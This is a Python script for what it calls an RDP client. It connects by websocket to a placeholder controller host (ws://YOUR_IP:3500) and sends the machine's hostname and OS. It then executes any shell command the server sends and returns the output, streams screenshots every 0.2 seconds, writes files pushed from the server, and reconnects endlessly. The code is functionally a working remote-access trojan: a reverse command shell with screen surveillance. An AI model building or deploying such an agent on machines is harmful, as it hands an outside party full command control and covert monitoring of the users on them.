#!/usr/bin/env python3
import asyncio
import websockets
import json
import base64
import subprocess
import platform
import os
from io import BytesIO
from datetime import datetime
from PIL import Image
import mss

class RDPClient:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = platform.node()
        self.websocket = None
        self.running = False
        self.screenshot_active = False
        self.screenshot_interval = 0.2
        self.download_path = os.getcwd()
        
    async def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                
                img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                
                buffered = BytesIO()
                img.save(buffered, format="JPEG", quality=40, optimize=True)
                img_str = base64.b64encode(buffered.getvalue()).decode()
                
                return img_str
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return None
            
    async def execute_command(self, command):
        if command.startswith('/download '):
            filename = command.split(' ', 1)[1].strip()
            return await self.download_file(filename)
            
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    executable='/bin/bash'
                )
                
            output = result.stdout if result.stdout else result.stderr
            return output
            
        except subprocess.TimeoutExpired:
            return "Error: Command timeout (30s)"
        except Exception as e:
            return f"Error: {str(e)}"
    
    async def download_file(self, filename):
        try:
            await self.websocket.send(json.dumps({
                'type': 'request_file',
                'filename': filename
            }))
            
            response = await self.websocket.recv()
            data = json.loads(response)
            
            if data['type'] == 'file_data' and data['success']:
                file_data = base64.b64decode(data['data'])
                
                os.makedirs(self.download_path, exist_ok=True)
                filepath = os.path.join(self.download_path, filename)
                
                with open(filepath, 'wb') as f:
                    f.write(file_data)
                
                return f"File downloaded successfully: {filepath}"
            else:
                error = data.get('error', 'Unknown error')
                return f"Download failed: {error}"
                
        except Exception as e:
            return f"Download error: {str(e)}"
            
    async def send_screenshot_loop(self):
        while self.running:
            if self.screenshot_active:
                try:
                    screenshot = await self.capture_screenshot()
                    if screenshot and self.websocket:
                        await self.websocket.send(json.dumps({
                            'type': 'screenshot',
                            'image': screenshot,
                            'timestamp': datetime.now().isoformat()
                        }))
                    await asyncio.sleep(self.screenshot_interval)
                except Exception as e:
                    print(f"Error in screenshot loop: {e}")
                    await asyncio.sleep(1)
            else:
                await asyncio.sleep(0.5)
                
    async def handle_commands(self):
        try:
            async for message in self.websocket:
                data = json.loads(message)
                
                if data['type'] == 'start_screenshot':
                    self.screenshot_active = True
                    print("Screenshot streaming started")
                    
                elif data['type'] == 'stop_screenshot':
                    self.screenshot_active = False
                    print("Screenshot streaming stopped")
                    
                elif data['type'] == 'command':
                    command = data['command']
                    print(f"Executing command: {command}")
                    
                    output = await self.execute_command(command)
                    
                    await self.websocket.send(json.dumps({
                        'type': 'command_output',
                        'command': command,
                        'output': output,
                        'timestamp': datetime.now().isoformat()
                    }))
                    
                elif data['type'] == 'file_data':
                    pass
                    
        except websockets.exceptions.ConnectionClosed:
            print("Connection closed")
            self.running = False
            
    async def connect(self):
        try:
            async with websockets.connect(self.server_url) as websocket:
                self.websocket = websocket
                self.running = True
                
                await websocket.send(json.dumps({
                    'type': 'register',
                    'client_id': self.client_id,
                    'hostname': platform.node(),
                    'os': platform.system()
                }))
                
                print(f"Connected to server as {self.client_id}")
                
                await asyncio.gather(
                    self.send_screenshot_loop(),
                    self.handle_commands()
                )
                
        except Exception as e:
            print(f"Connection error: {e}")
            self.running = False
            
    async def start(self):
        while True:
            try:
                await self.connect()
            except Exception as e:
                print(f"Error: {e}")
            
            print("Reconnecting in 5 seconds...")
            await asyncio.sleep(5)

if __name__ == '__main__':
    SERVER_URL = "ws://YOUR_IP:3500"
    
    client = RDPClient(SERVER_URL)
    asyncio.run(client.start())